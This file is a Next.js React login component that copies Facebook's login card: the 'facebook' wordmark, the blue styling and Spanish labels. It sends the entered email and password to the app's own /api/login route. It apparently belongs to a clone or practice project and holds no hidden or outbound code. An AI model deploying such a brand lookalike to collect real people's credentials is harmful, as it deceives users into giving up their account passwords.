"use client"
import Link from "next/link";
import { useRouter } from "next/navigation";
import { useState, type FormEvent } from "react";
import {redirect} from "next/navigation"

const LoginCard = () => {
  const router = useRouter()
  const [email, setEmail] = useState<string>();
  const [password, setPassword] = useState<string>();
  const [failed, setFailed] = useState(false);

  const handleLogin = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    const res = await fetch(`${window.location.origin}/api/login`, {
      method: "POST",
      body: JSON.stringify({
        email,
        password,
      }),
    });
    if (res.ok)
      redirect("/");
    else setFailed(true);
  };

  return (
    <div className="flex flex-col w-1/3 rounded-md  bg-white shadow-lg p-4 text-lg divide-y-2 space-y-4">
      <form onSubmit={(e) => handleLogin(e)} className="flex flex-col gap-3">
        <h1 className="text-4xl font-bold text-blue-600">facebook</h1>
        <label title="Email">
          <input
            type="email"
            value={email}
            onChange={({ target }) => setEmail(target.value)}
            required={true}
            className="w-full border rounded-md p-3"
            placeholder="Correo electrónico"
          />
        </label>

        <label title="Contraseña">
          <input
            type="password"
            value={password}
            onChange={({ target }) => setPassword(target.value)}
            required={true}
            className="w-full border rounded-md p-3"
            placeholder="Contraseña"
          />
        </label>
        {failed && (
          <p className="text-sm text-red-500">
            Correo o contraseña incorrectos
          </p>
        )}

        <button className="w-full p-3 border rounded-md bg-blue-500 text-white font-medium hover:bg-blue-600">
          Iniciar sesión
        </button>
      </form>
      <div className="flex place-content-center pt-4">
        <Link href="/signup" className="w-fit p-3 border rounded-md bg-green-500 text-white font-medium hover:bg-green-600">
          Crear cuenta nueva
        </Link>
      </div>
    </div>
  );
};
export default LoginCard;
